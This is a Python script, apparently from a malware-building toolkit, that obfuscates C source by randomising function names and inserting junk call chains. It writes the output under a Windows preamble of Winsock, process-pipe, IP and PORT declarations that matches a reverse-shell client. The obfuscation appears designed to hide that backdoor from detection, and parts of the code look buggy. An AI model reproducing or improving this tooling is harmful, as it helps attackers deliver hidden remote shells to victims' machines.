'''
Library made for working one generated and obfuscated C source code.
-class FUNCTION
-class OBFUSCATED
-string RandomizedString(len: int)
-string RandomizedDictionnary(dictionnary: str)
-string GenerateC(complexity:int)
-string ObfuscateC(inputFile: str, complexity)
-string GenerateObfuscated(obfuscated: OBFUSCATED, outputfile: str)
-string Compile(source: str)
'''
# from SRC.Libs import LibShellcode
# from SRC.Libs import LibByteEditor
# from SRC.Libs import LibDebug
import random
import re
import os


class FUNCTION:
    def __init__(self):
        self.name = ""
        self.content = ""


class OBFUSCATED:
    def __init__(self):
        self.dictionnary = ""
        self.includes = []
        self.functions = []


def RandomizedString(len: int):
    '''
    Generate a random string of size 'len'
    -return: string
    '''
    dic = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    formated = ""
    for _ in range(0, len):
        formated += dic[random.randint(0, 51)]
    return formated


def RandomizedDictionnary(dictionnary: str):
    '''
    Randomize a string 'dictionnary'
    -return: string
    '''
    used_child = ""
    for _ in dictionnary:
        child_content = dictionnary[random.randint(0, len(dictionnary)-1)]
        while len(used_child) < len(dictionnary):
            if child_content in used_child:
                child_content = dictionnary[random.randint(
                    0, len(dictionnary)-1)]
            else:
                used_child += child_content
    return used_child
    
def ObfuscateC(inputFile: str, complexity):
    '''
    Obfuscate a C code source based on complexity.
    -return: string
    '''
    MainObfuscated_name = ""
    Source_code_annalyzed = OBFUSCATED()
    Source_code_annalyzed.dictionnary = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    Source_code_annalyzed.dictionnary = RandomizedDictionnary(
        Source_code_annalyzed.dictionnary)
    with open(inputFile, mode='r') as f:
        content = f.read()
    Source_code_annalyzed.includes = re.findall(
        r'#include <[a-zA-Z0-9\.]*>', content)
    functionsName = re.findall(
        r'[a-zA-Z0-9_][a-zA-Z0-9_]* [a-zA-Z0-9_][a-zA-Z0-9_]*\(.*\)\n{', content)
    for i in range(0, len(functionsName)):
        if functionsName[i][-1:] != '{':
            functionsName[i] += '\n{'
    functionsContent = re.findall(r'{\/\/START.*?}\/\/END', content, flags=re.S)
    for i in range(0, len(functionsContent)):
        functionsContent[i] = functionsContent[i].replace('//START', '')
        functionsContent[i] = functionsContent[i].replace('//END', '')
        functionsContent[i] = functionsContent[i][1:-1]
    for i in range(0, len(functionsName)):
        function = FUNCTION()
        function.name = functionsName[i]
        function.content = functionsContent[i]
        Source_code_annalyzed.functions.append(function)
    for function in Source_code_annalyzed.functions:
        splited = ""
        splited = function.name.split(' ')
        if "main(" not in splited[1]:
            Obfuscated_name = ""
            Obfuscated_name = splited[0] + ' ' + \
                RandomizedString(complexity)
            splited = function.name.split('(')
            Obfuscated_name += '(' + splited[1]
            splited = function.name.split(' ')[1]
            splited = splited.split('(')[0]
            Obfuscated_splited = Obfuscated_name.split(' ')[1]
            Obfuscated_splited = Obfuscated_splited.split('(')[0]
            for i in range(0, len(Source_code_annalyzed.functions)):
                if splited + '(' in Source_code_annalyzed.functions[i].content:
                    Source_code_annalyzed.functions[i].content = Source_code_annalyzed.functions[i].content.replace(
                        splited + '(', Obfuscated_splited + '(')
                if splited + ',' in Source_code_annalyzed.functions[i].content:
                    Source_code_annalyzed.functions[i].content = Source_code_annalyzed.functions[i].content.replace(
                        splited + ',', Obfuscated_splited + ',')
                if function.name == Source_code_annalyzed.functions[i].name:
                    Source_code_annalyzed.functions[i].name = Obfuscated_name
        else:
            Obfuscated_name = ""
            Obfuscated_name = splited[0] + ' ' + \
                RandomizedString(complexity)
            splited = function.name.split('(')
            Obfuscated_name += '(' + splited[1]
            splited = function.name.split(' ')[1]
            splited = splited.split('(')[0]
            Obfuscated_splited = Obfuscated_name.split(' ')[1]
            Obfuscated_splited = Obfuscated_splited.split('(')[0]
            for i in range(0, len(Source_code_annalyzed.functions)):
                if splited + '(' in Source_code_annalyzed.functions[i].content:
                    Source_code_annalyzed.functions[i].content = Source_code_annalyzed.functions[i].content.replace(
                        splited + '(', Obfuscated_splited + '(')
                if splited + ',' in Source_code_annalyzed.functions[i].content:
                    Source_code_annalyzed.functions[i].content = Source_code_annalyzed.functions[i].content.replace(
                        splited + ',', Obfuscated_splited + ',')
                if function.name == Source_code_annalyzed.functions[i].name:
                    Source_code_annalyzed.functions[i].name = Obfuscated_name
                MainObfuscated_name = Obfuscated_name.split(' ')[1].replace('()\n{','')

    main_function = FUNCTION()
    main_function.name = "int main(){\n"
    number_of_functions = complexity
    a = 0
    namesize = complexity
    nameTMP = ""
    trigg = 0
    Source_code_annalyzed_backup = []
    for fname in Source_code_annalyzed.functions:
        Source_code_annalyzed_backup.append(fname.name)
    for _ in range(0, number_of_functions):
        function = FUNCTION()
        nameTMP = RandomizedString(namesize)
        if len(Source_code_annalyzed.functions) == 0:
            function.name = "void " + RandomizedString(namesize) + "(){\n"
        else:
            for func in Source_code_annalyzed.functions:
                if "void " + nameTMP + "(){\n" == func.name:
                    namesize += 1
                    trigg = 1
        if trigg:
            function.name = "void " + RandomizedString(namesize) + "(){\n"
            trigg = 0
        else:
            function.name = "void " + nameTMP + "(){\n"
        function.content = ""
        Source_code_annalyzed.functions.insert(0,function)
        for _ in range(0, number_of_functions):
            splited = Source_code_annalyzed.functions[random.randint(
                0, len(Source_code_annalyzed.functions)-1)].name.split(' ')[1]
            splitedBase = Source_code_annalyzed.functions[a].name.split(' ')[1]
            if splited[:-4] != splitedBase[:-4]:
                fn = []
                for f in Source_code_annalyzed_backup:
                    fn.append(f.split(' ')[1])
                if splited not in fn:
                    Source_code_annalyzed.functions[a].content += splited.split('(')[
                        0] + "();\n"
                    
        a += 1
    for _ in range(0, number_of_functions):
        splited = Source_code_annalyzed.functions[random.randint(
            1, number_of_functions-1)].name.split(' ')[1]
        if splited not in fn:
            main_function.content += splited.split('(')[0] + "();\n"
    main_function.content += MainObfuscated_name+"();\nreturn 0;\n"
    Source_code_annalyzed.functions.append(main_function)

    return GenerateObfuscated(Source_code_annalyzed, "Obfuscated_source.c")


def GenerateObfuscated(obfuscated: OBFUSCATED, outputfile: str):
    '''
    Generate an OBFUSCATED object.
    return: string
    '''
    outputfile = "CL/Windows/GeneratedC_" + outputfile
    f = open(outputfile, 'w+')
    f.write("""#define _WIN32_WINNT 0x501
#define DEFAULT_BUFLEN 512

#include <windows.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <signal.h>

typedef struct Pipe0
{
    HANDLE HANDLES[4];
    int bufsize;
} * Pipe;
Pipe pipe;

char OUTPUT_text[4096];
DWORD OUTPUT_size;
char *IP;
char *PORT;
SECURITY_ATTRIBUTES sa;
STARTUPINFO si;
PROCESS_INFORMATION pi;

Pipe create_pipes();
PTSTR pipe_init();
int frompipe(HANDLE in, HANDLE ou);
int read_config();
void init_socket();

void SignalHandler(int signal)
{//START

}//END""")
    f.write('\n')
    for function in obfuscated.functions:
        f.write(function.name)
        f.write(function.content)
        f.write('}\n')
    f.close()
    return outputfile

ObfuscateC("CL\Windows\main.c", 101)